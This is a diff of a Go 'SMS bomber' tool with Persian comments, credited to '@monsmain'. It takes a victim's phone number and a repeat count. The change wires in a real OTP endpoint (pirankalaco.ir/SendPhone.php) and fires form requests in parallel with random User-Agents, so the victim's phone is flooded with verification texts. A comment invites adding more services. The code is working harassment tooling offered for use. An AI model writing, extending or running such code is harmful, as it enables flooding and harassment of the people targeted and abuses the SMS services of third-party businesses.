@@ -18,7 +18,7 @@ import (
 	"time"
 
 	"net/http/cookiejar"
-	"math/rand" // اضافه شده برای انتخاب تصادفی User-Agent
+	"math/rand"
 )
 
 // لیست User-Agentهایی که شما ارائه دادید
@@ -337,9 +337,9 @@ func main() {
 `)
 	fmt.Print("\033[0m")
 
-
-	// تعداد سرویس های فعال فعلی 0 است
-	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m0 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m0\n\n")
+    // تعداد سرویس های فعال فعلی 1 است
+    totalActiveServices := 1
+	fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m%d \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m0\n\n", totalActiveServices)
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
 	var phone string
 	fmt.Scan(&phone)
@@ -383,9 +383,9 @@ func main() {
 		Timeout: 10 * time.Second,
 	}
 
-    // کانال‌ها با اندازه حداقل تنظیم شده‌اند چون هیچ درخواستی به صورت پیش‌فرض اضافه نمی‌شود
-	tasks := make(chan func(), 1) // اندازه 1 یا کوچکتر
-	ch := make(chan int, 1)      // اندازه 1 یا کوچکتر
+    // کانال ها برای 1 سرویس فعال تنظیم می شوند
+	tasks := make(chan func(), repeatCount * totalActiveServices)
+	ch := make(chan int, repeatCount * totalActiveServices)
 
 
 	var wg sync.WaitGroup
@@ -398,31 +398,31 @@ func main() {
 		}()
 	}
 
-	// حلقه اصلی برای اضافه کردن درخواست‌ها - در حال حاضر خالی است
-    // اگر می‌خواهید سرویس‌های وب را اضافه کنید، باید بلوک‌های wg.Add و tasks <- func(...) را اینجا اضافه کنید.
+	// حلقه اصلی برای اضافه کردن درخواست‌ها
 	for i := 0; i < repeatCount; i++ {
-		// pirankalaco.ir (OTP - POST Form)
+		// pirankalaco.ir (OTP - POST Form) - اضافه شده
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("phone", phone) 
+				formData.Set("phone", phone)
 				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
 			}
 		}(client)
+
+        // اگر می‌خواهید سرویس‌های دیگری اضافه کنید، بلوک‌های مشابه را اینجا اضافه کنید
 	}
 
 
-	close(tasks) // کانال tasks بلافاصله بسته می‌شود چون هیچ وظیفه‌ای به آن اضافه نشده است
+	close(tasks) // بستن کانال tasks پس از ارسال همه وظایف
 
 	go func() {
-		wg.Wait() // چون هیچ wg.Add(1) در حلقه وجود ندارد، این بلافاصله برمی‌گردد
-		close(ch) // کانال ch بلافاصله بسته می‌شود
+		wg.Wait() // منتظر می‌ماند تا همه وظایف wg.Done فراخوانی کنند
+		close(ch) // پس از اتمام همه وظایف، کانال نتایج را می‌بندد
 	}()
 
-	// پردازش نتایج - این حلقه چون کانال ch بلافاصله بسته می‌شود، کاری انجام نمی‌دهد
+	// پردازش نتایج
 	for statusCode := range ch {
-		// این بخش در حال حاضر اجرا نخواهد شد چون کانال ch فورا بسته می شود
 		if statusCode >= 400 || statusCode == 0 {
 			fmt.Println("\033[01;31m[-] Error or Canceled!")
 		} else {
@@ -430,7 +430,7 @@ func main() {
 		}
 	}
 
-    fmt.Println("\033[01;33m[*] No services are currently active. Add URLs to the main loop to send requests with random User-Agents.\033[0m")
+    fmt.Println("\033[01;33m[*] Done sending requests.\033[0m")
 
 }
 //Code by @monsmain
